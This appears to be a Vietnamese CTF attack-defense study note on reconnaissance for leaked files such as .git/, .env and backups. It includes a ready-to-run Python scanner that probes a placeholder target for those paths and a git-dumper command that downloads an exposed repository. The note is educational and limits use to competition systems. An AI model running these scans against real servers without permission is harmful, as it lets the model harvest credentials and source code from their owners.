# Recon & Source Leak (kiểm tra server có "để quên" lộ file nhạy cảm không)

Trước khi nghĩ tới SQLi, XSS hay bất kỳ lỗ hổng phức tạp nào, luôn thử xem server có vô tình để lộ file nhạy cảm ra ngoài không — ví dụ thư mục `.git/` (chứa toàn bộ lịch sử code), file `.env` (chứa mật khẩu database, API key), hay file backup `.bak` quên xóa. Giống việc kiểm tra cửa sau/cửa sổ nhà có khóa chưa trước khi cố đi vào cửa chính — nếu cửa sau mở sẵn, bạn vào thẳng, đọc được toàn bộ mã nguồn, biết chính xác lỗ hổng nằm ở đâu, nhanh hơn hẳn việc dò mù từng loại payload.

Đây là bước nên làm ĐẦU TIÊN với MỌI service mới nhận, trước cả khi biết service đó chạy công nghệ gì — vì chỉ cần vài giây kiểm tra đúng chỗ có thể tiết kiệm rất nhiều thời gian dò lỗ hổng khác.

Trên Burp bạn nhận ra lỗi này khi: thử truy cập `/.git/config` hoặc `/.env` và response trả về 200 kèm nội dung thật (không phải trang 404 báo không tìm thấy) — đó là dấu hiệu server đang phục vụ nhầm file/thư mục không nên công khai.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# Danh sách đường dẫn hay bị lộ -- thử theo thứ tự ưu tiên cao nhất trước
PATHS = [
    ".git/config",
    ".git/HEAD",
    ".env",
    "robots.txt",
    "backup.zip",
    "config.php.bak",
]

def solve_one(session, base_url):
    for p in PATHS:
        r = session.get(f"{base_url}/{p}", timeout=5)
        print(p, "->", r.status_code, "len=", len(r.text))
        if r.status_code != 200:
            continue  # 404/403 -- không lộ, hoặc bị chặn, thử path khác

        # Nếu flag nằm ngay trong file lộ ra (ví dụ .env ghi thẳng flag, hoặc trang hiếm khi vậy)
        m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r.text)
        if m:
            return m.group(0)

        # Không có flag trực tiếp, nhưng VẪN LỘ -- in ra để tự đọc tay, quyết định bước tiếp theo
        # (ví dụ nếu .git/config lộ, bước tiếp là chạy git-dumper để dump toàn bộ source,
        #  không làm được chỉ bằng 1 request HTTP đơn giản như script này)
        print(f"LỘ nhưng chưa thấy flag trực tiếp: {p} ({len(r.text)} bytes) -- kiểm tra tay")
    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- `PATHS` là 1 list (danh sách) các đường dẫn quen thuộc hay bị lộ do deploy ẩu — vòng `for` thử lần lượt từng cái, không cần đoán trước cái nào đúng.
- `r.status_code != 200: continue` — `continue` nghĩa là "bỏ qua phần code còn lại của lần lặp này, nhảy sang phần tử tiếp theo trong `for`". Ở đây dùng để bỏ qua ngay các path trả 404 (không tồn tại) hoặc lỗi khác, không cần xử lý tiếp.
- Với mỗi path trả 200 (tồn tại thật), script thử tìm flag trực tiếp trong nội dung bằng regex — nhưng phần lớn trường hợp thực tế (đặc biệt `.git/config`), file lộ ra KHÔNG chứa flag trực tiếp, mà là bước đầu để bạn tự chạy tiếp công cụ khác (như `git-dumper`) đọc toàn bộ source rồi mới tìm ra lỗ hổng/flag thật — script này chỉ làm đúng việc "dò xem có lộ gì không", phần dump sâu hơn cần làm tay ngoài script.
- `print(...)` ở mỗi bước giúp bạn nhìn thấy ngay path nào lộ (status 200) mà không cần đoán — đúng tinh thần "in ra và nhìn" đã nói ở bài Bắt Đầu Từ 0.

## Lưu ý nhanh

- Nếu `.git/config` lộ (status 200), đừng cố đọc flag trực tiếp từ nó — chạy ngay `python3 ~/hoc/CTF/Tools/web/git-dumper/git_dumper.py http://target/.git/ ./dumped_source` để dump toàn bộ source, rồi đọc code tìm đúng lỗ hổng/flag hardcode.
- Nếu `.git/` trả 403 (không phải 404), thư mục vẫn TỒN TẠI nhưng bị chặn liệt kê — `git-dumper` vẫn có thể dump được vì nó tải từng file theo tên đã đoán trước, không cần liệt kê thư mục.
- Recon thường chỉ cần làm 1 LẦN trên service của chính đội mình (vì mọi đội chạy cùng service, cấu trúc file giống nhau) — không cần quét lại mỗi round, chỉ script khai thác cụ thể (sau khi đã biết path nào ăn) mới cần lặp lại.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
